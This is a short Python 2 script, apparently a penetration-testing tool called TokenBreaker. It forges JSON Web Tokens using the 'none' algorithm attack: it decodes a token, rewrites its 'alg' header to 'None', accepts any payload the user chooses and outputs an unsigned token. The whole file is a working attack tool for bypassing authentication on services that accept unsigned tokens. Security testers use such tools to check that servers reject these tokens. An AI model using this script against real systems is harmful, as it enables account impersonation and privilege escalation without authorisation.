#!/usr/bin/python

import argparse
import base64
import sys
import re
from art import *
from huepy import *

def verify_Padding(data):
    missing_padding = len(data) % 4
    if missing_padding != 0:
        data += b'='* (4 - missing_padding)
    return data

def processTheNoneToken(token):
    header=base64.b64decode(verify_Padding(token.split('.')[0]))
    payload=base64.b64decode(verify_Padding(token.split('.')[1]))
    print blue("\nDecoded Header value is : "+header)
    print blue("Decode Payload value is : "+payload)
    header=re.sub('"alg":".{5}"','"alg":"None"',header)
    print green("\nNew header value with none algorithm:")
    print header

    modify_response=raw_input("\nModify Header? (y/n): ")
    if modify_response == 'y':
        header=raw_input("Enter your header with 'alg' field set to 'None': ")
        print green("Header set to: " + header)
    payload=raw_input("Enter your payload: ")
    base64header = base64.b64encode(header).rstrip('=')
    base64payload = base64.b64encode(payload).rstrip('=')
    finaljwt = base64header + '.' + base64payload + "."
    print green("\nSuccessfully encoded Token: \n" + finaljwt)

def main():
    parser = argparse.ArgumentParser(description='TokenBreaker: 1.TheNoneAlgorithm',
            epilog='Example Usage: \npython TheNone.py -t [JWTtoken]\n')
    requiredparser=parser.add_argument_group('required arguments')
    requiredparser.add_argument('-t','--token',help="JWT Token value",required=True)
    args = parser.parse_args()
    tprint('The None')
    processTheNoneToken(args.token)

if __name__=='__main__':
    main()
